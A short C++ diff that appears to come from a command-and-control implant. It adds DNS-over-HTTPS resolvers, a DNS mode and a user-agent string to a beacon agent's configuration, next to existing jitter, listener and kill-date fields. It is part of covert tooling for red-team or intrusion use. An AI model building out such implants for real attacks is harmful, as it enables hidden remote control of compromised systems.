@@ -83,6 +83,7 @@ AgentConfig::AgentConfig()
 #elif defined(BEACON_DNS)
 	this->profile.domain        = packer->UnpackBytesCopy(&length);
 	this->profile.resolvers     = packer->UnpackBytesCopy(&length);
+	this->profile.doh_resolvers = packer->UnpackBytesCopy(&length);
 	this->profile.qtype         = packer->UnpackBytesCopy(&length);
 	this->profile.pkt_size      = packer->Unpack32();
 	this->profile.label_size    = packer->Unpack32();
@@ -91,6 +92,8 @@ AgentConfig::AgentConfig()
 	this->profile.burst_enabled = packer->Unpack32();
 	this->profile.burst_sleep   = packer->Unpack32();
 	this->profile.burst_jitter  = packer->Unpack32();
+	this->profile.dns_mode      = packer->Unpack32();
+	this->profile.user_agent    = packer->UnpackBytesCopy(&length);
 
 	this->listener_type = packer->Unpack32();
 	this->kill_date     = packer->Unpack32();
